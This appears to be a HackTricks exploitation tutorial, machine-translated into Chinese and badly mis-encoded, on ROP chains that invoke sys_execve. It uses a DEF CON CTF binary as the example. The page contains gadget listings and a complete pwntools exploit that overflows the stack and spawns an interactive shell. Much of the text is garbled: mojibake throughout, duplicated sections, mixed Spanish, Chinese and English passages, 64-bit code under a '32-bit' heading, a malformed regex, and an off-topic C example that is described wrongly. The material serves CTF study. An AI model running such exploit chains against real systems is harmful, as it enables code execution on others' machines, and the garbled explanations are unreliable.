# ROP - è°ƒç”¨ sys\_execve

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks äº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨ HackTricks ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASS çš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks ä»“åº“**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud ä»“åº“**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤ PR æ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

ä¸ºäº†å‡†å¤‡è°ƒç”¨ **syscall**ï¼Œéœ€è¦è¿›è¡Œä»¥ä¸‹é…ç½®ï¼š

* `rax: 59 æŒ‡å®š sys_execve`
* `rdi: æŒ‡å‘ "/bin/sh" çš„æŒ‡é’ˆï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„æ–‡ä»¶`
* `rsi: 0 æŒ‡å®šæ²¡æœ‰ä¼ é€’å‚æ•°`
* `rdx: 0 æŒ‡å®šæ²¡æœ‰ä¼ é€’ç¯å¢ƒå˜é‡`

å› æ­¤ï¼ŒåŸºæœ¬ä¸Šéœ€è¦åœ¨æŸä¸ªåœ°æ–¹å†™å…¥å­—ç¬¦ä¸² `/bin/sh`ï¼Œç„¶åæ‰§è¡Œ `syscall`ï¼ˆæ³¨æ„éœ€è¦æ§åˆ¶å †æ ˆçš„å¡«å……ï¼‰ã€‚

## æ§åˆ¶å¯„å­˜å™¨

è®©æˆ‘ä»¬ä»æ‰¾åˆ°**å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨**å¼€å§‹ï¼š
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
ä½¿ç”¨è¿™äº›åœ°å€ï¼Œå¯ä»¥å°†å†…å®¹å†™å…¥å †æ ˆå¹¶åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ã€‚

## å†™å…¥å­—ç¬¦ä¸²

### å¯å†™å†…å­˜

é¦–å…ˆï¼Œæ‚¨éœ€è¦åœ¨å†…å­˜ä¸­æ‰¾åˆ°ä¸€ä¸ªå¯å†™çš„ä½ç½®
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### å†™å…¥å­—ç¬¦ä¸²

ç„¶åä½ éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•å°†ä»»æ„å†…å®¹å†™å…¥è¿™ä¸ªåœ°å€ä¸­
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32ä½

##### ROP + syscall + execv

##### ROP + syscall + execv

Esta tÃ©cnica se utiliza para ejecutar un comando en un sistema Linux de 32 bits utilizando la tÃ©cnica de Return-Oriented Programming (ROP), llamadas al sistema (syscalls) y la funciÃ³n execv.

è¿™ç§æŠ€æœ¯ç”¨äºåœ¨32ä½Linuxç³»ç»Ÿä¸Šä½¿ç”¨Return-Oriented Programming (ROP)æŠ€æœ¯ã€ç³»ç»Ÿè°ƒç”¨(syscalls)å’Œexecvå‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ã€‚

La tÃ©cnica ROP se utiliza para construir una cadena de gadgets (pequeÃ±os fragmentos de cÃ³digo) que se encuentran en la memoria del programa vulnerable. Estos gadgets se utilizan para manipular el flujo de ejecuciÃ³n del programa y lograr la ejecuciÃ³n de cÃ³digo arbitrario.

ROPæŠ€æœ¯ç”¨äºæ„å»ºä¸€ä¸ªgadgeté“¾ï¼ˆå°ä»£ç ç‰‡æ®µï¼‰ï¼Œè¿™äº›gadgetä½äºå—æ¼æ´ç¨‹åºçš„å†…å­˜ä¸­ã€‚è¿™äº›gadgetç”¨äºæ“çºµç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œå®ç°ä»»æ„ä»£ç çš„æ‰§è¡Œã€‚

En este caso, utilizaremos gadgets que nos permitan llamar a una syscall especÃ­fica, en este caso la syscall execve, que nos permitirÃ¡ ejecutar un comando en el sistema.

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨èƒ½å¤Ÿè°ƒç”¨ç‰¹å®šç³»ç»Ÿè°ƒç”¨çš„gadgetï¼Œä¾‹å¦‚execveç³»ç»Ÿè°ƒç”¨ï¼Œè¯¥ç³»ç»Ÿè°ƒç”¨å…è®¸æˆ‘ä»¬åœ¨ç³»ç»Ÿä¸­æ‰§è¡Œå‘½ä»¤ã€‚

La syscall execve toma tres argumentos: la direcciÃ³n de la cadena que contiene el comando a ejecutar, un array de argumentos y un array de variables de entorno.

execveç³»ç»Ÿè°ƒç”¨æ¥å—ä¸‰ä¸ªå‚æ•°ï¼šåŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤çš„å­—ç¬¦ä¸²çš„åœ°å€ã€å‚æ•°æ•°ç»„å’Œç¯å¢ƒå˜é‡æ•°ç»„ã€‚

Para utilizar esta tÃ©cnica, primero necesitamos encontrar los gadgets necesarios en el programa vulnerable. Estos gadgets deben cumplir con ciertas condiciones, como la existencia de instrucciones "pop" para desapilar valores de la pila y cargarlos en registros, y la existencia de instrucciones "ret" para retornar a la direcciÃ³n siguiente en la pila.

è¦ä½¿ç”¨è¿™ç§æŠ€æœ¯ï¼Œé¦–å…ˆéœ€è¦åœ¨å—æ¼æ´ç¨‹åºä¸­æ‰¾åˆ°æ‰€éœ€çš„gadgetã€‚è¿™äº›gadgetå¿…é¡»æ»¡è¶³ä¸€å®šçš„æ¡ä»¶ï¼Œä¾‹å¦‚å­˜åœ¨ç”¨äºä»å †æ ˆä¸­å¼¹å‡ºå€¼å¹¶å°†å…¶åŠ è½½åˆ°å¯„å­˜å™¨ä¸­çš„"pop"æŒ‡ä»¤ï¼Œä»¥åŠå­˜åœ¨ç”¨äºè¿”å›åˆ°å †æ ˆä¸­çš„ä¸‹ä¸€ä¸ªåœ°å€çš„"ret"æŒ‡ä»¤ã€‚

Una vez que hemos identificado los gadgets necesarios, construimos una cadena de ROP que los utilice en el orden correcto para lograr la ejecuciÃ³n de la syscall execve.

ä¸€æ—¦æˆ‘ä»¬ç¡®å®šäº†æ‰€éœ€çš„gadgetï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„å»ºä¸€ä¸ªROPé“¾ï¼ŒæŒ‰ç…§æ­£ç¡®çš„é¡ºåºä½¿ç”¨å®ƒä»¬æ¥å®ç°execveç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œã€‚

La cadena de ROP se construye colocando las direcciones de memoria de los gadgets en la pila en el orden correcto, seguidas de los argumentos necesarios para la syscall execve.

ROPé“¾çš„æ„å»ºæ˜¯å°†gadgetçš„å†…å­˜åœ°å€æŒ‰æ­£ç¡®çš„é¡ºåºæ”¾ç½®åœ¨å †æ ˆä¸Šï¼Œç„¶åæ˜¯execveç³»ç»Ÿè°ƒç”¨æ‰€éœ€çš„å‚æ•°ã€‚

Una vez que la cadena de ROP estÃ¡ construida, se sobrescribe la direcciÃ³n de retorno de la funciÃ³n vulnerable con la direcciÃ³n de inicio de la cadena de ROP.

æ„å»ºå¥½ROPé“¾åï¼Œå°†å—æ¼æ´å‡½æ•°çš„è¿”å›åœ°å€è¦†ç›–ä¸ºROPé“¾çš„èµ·å§‹åœ°å€ã€‚

Cuando la funciÃ³n vulnerable retorna, en lugar de retornar a la direcciÃ³n original de retorno, se ejecutarÃ¡ la cadena de ROP, que a su vez ejecutarÃ¡ la syscall execve y ejecutarÃ¡ el comando especificado.

å½“å—æ¼æ´å‡½æ•°è¿”å›æ—¶ï¼Œå®ƒå°†ä¸ä¼šè¿”å›åˆ°åŸå§‹çš„è¿”å›åœ°å€ï¼Œè€Œæ˜¯æ‰§è¡ŒROPé“¾ï¼Œè¿›è€Œæ‰§è¡Œexecveç³»ç»Ÿè°ƒç”¨å¹¶æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚

Esta tÃ©cnica es muy poderosa, ya que nos permite ejecutar comandos arbitrarios en el sistema, lo que puede ser utilizado para obtener una shell remota o realizar otras acciones maliciosas.

è¿™ç§æŠ€æœ¯éå¸¸å¼ºå¤§ï¼Œå› ä¸ºå®ƒå…è®¸æˆ‘ä»¬åœ¨ç³»ç»Ÿä¸­æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè¿™å¯ä»¥ç”¨äºè·å–è¿œç¨‹shellæˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64ä½

##### ROP (Return Oriented Programming) - execv

##### ROPï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹ï¼‰- execv

The execv function is used to execute a program. It takes two arguments: the path to the program and an array of strings that represent the program's arguments. The array must be terminated with a NULL pointer.

execvå‡½æ•°ç”¨äºæ‰§è¡Œç¨‹åºã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼šç¨‹åºçš„è·¯å¾„å’Œä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œè¡¨ç¤ºç¨‹åºçš„å‚æ•°ã€‚è¯¥æ•°ç»„å¿…é¡»ä»¥NULLæŒ‡é’ˆç»“å°¾ã€‚

To call execv using ROP, we need to find the address of the execv function in memory and the addresses of the arguments we want to pass to it. We can do this by leaking memory or by using gadgets to load the addresses into registers.

è¦ä½¿ç”¨ROPè°ƒç”¨execvï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å†…å­˜ä¸­execvå‡½æ•°çš„åœ°å€ä»¥åŠæˆ‘ä»¬è¦ä¼ é€’ç»™å®ƒçš„å‚æ•°çš„åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³„æ¼å†…å­˜æˆ–ä½¿ç”¨gadgetå°†åœ°å€åŠ è½½åˆ°å¯„å­˜å™¨ä¸­æ¥å®ç°è¿™ä¸€ç‚¹ã€‚

Once we have the addresses, we can construct a ROP chain that sets up the arguments and calls execv. The ROP chain will consist of gadgets that load the arguments into registers and gadgets that call the execv function.

ä¸€æ—¦æˆ‘ä»¬æœ‰äº†è¿™äº›åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„å»ºä¸€ä¸ªROPé“¾ï¼Œè®¾ç½®å‚æ•°å¹¶è°ƒç”¨execvã€‚ROPé“¾å°†ç”±å°†å‚æ•°åŠ è½½åˆ°å¯„å­˜å™¨ä¸­çš„gadgetå’Œè°ƒç”¨execvå‡½æ•°çš„gadgetç»„æˆã€‚

Here is an example of a ROP chain that calls execv:

ä¸‹é¢æ˜¯ä¸€ä¸ªè°ƒç”¨execvçš„ROPé“¾çš„ç¤ºä¾‹ï¼š

```
pop_rdi = 0x0000000000400686 # pop rdi ; ret
pop_rsi_r15 = 0x0000000000400684 # pop rsi ; pop r15 ; ret
null = 0x0000000000000000

rop_chain = [
    pop_rdi, path_to_program,
    pop_rsi_r15, args_array, null,
    execv
]
```

```
pop_rdi = 0x0000000000400686 # pop rdi ; ret
pop_rsi_r15 = 0x0000000000400684 # pop rsi ; pop r15 ; ret
null = 0x0000000000000000

rop_chain = [
    pop_rdi, path_to_program,
    pop_rsi_r15, args_array, null,
    execv
]
```

In this example, `pop_rdi` and `pop_rsi_r15` are gadgets that pop values from the stack into the `rdi`, `rsi`, and `r15` registers, respectively. `null` is a NULL pointer. `path_to_program` is the address of the string that represents the path to the program, and `args_array` is the address of the array of strings that represent the program's arguments.

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ`pop_rdi`å’Œ`pop_rsi_r15`æ˜¯ä»å †æ ˆä¸­å¼¹å‡ºå€¼åˆ°`rdi`ã€`rsi`å’Œ`r15`å¯„å­˜å™¨çš„gadgetã€‚`null`æ˜¯ä¸€ä¸ªNULLæŒ‡é’ˆã€‚`path_to_program`æ˜¯è¡¨ç¤ºç¨‹åºè·¯å¾„çš„å­—ç¬¦ä¸²çš„åœ°å€ï¼Œ`args_array`æ˜¯è¡¨ç¤ºç¨‹åºå‚æ•°çš„å­—ç¬¦ä¸²æ•°ç»„çš„åœ°å€ã€‚

By constructing a ROP chain like this, we can execute arbitrary programs with arbitrary arguments using the execv function.

é€šè¿‡æ„å»ºè¿™æ ·çš„ROPé“¾ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨execvå‡½æ•°æ‰§è¡Œä»»æ„ç¨‹åºï¼Œå¹¶ä¼ é€’ä»»æ„å‚æ•°ã€‚
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## ç¤ºä¾‹

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", NULL};
    execv(args[0], args);
    return 0;
}
```

This is a simple C program that executes a shell (/bin/sh) using the `execv` function. The `execv` function takes two arguments: the path to the executable (/bin/sh) and an array of strings representing the command-line arguments (in this case, just NULL).

When this program is compiled and executed, it will spawn a shell process, allowing the user to interact with the command line.

## ä¾‹å­

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char *args[] = {"/bin/sh", NULL};
    execv(args[0], args);
    return 0;
}
```

è¿™æ˜¯ä¸€ä¸ªç®€å•çš„Cç¨‹åºï¼Œä½¿ç”¨`execv`å‡½æ•°æ‰§è¡Œä¸€ä¸ªshell (/bin/sh)ã€‚`execv`å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼šå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ (/bin/sh) å’Œä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œè¡¨ç¤ºå‘½ä»¤è¡Œå‚æ•°ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œåªæœ‰NULLï¼‰ã€‚

å½“ç¼–è¯‘å¹¶æ‰§è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œå®ƒå°†ç”Ÿæˆä¸€ä¸ªshellè¿›ç¨‹ï¼Œå…è®¸ç”¨æˆ·ä¸å‘½ä»¤è¡Œè¿›è¡Œäº¤äº’ã€‚
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## å‚è€ƒèµ„æ–™

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
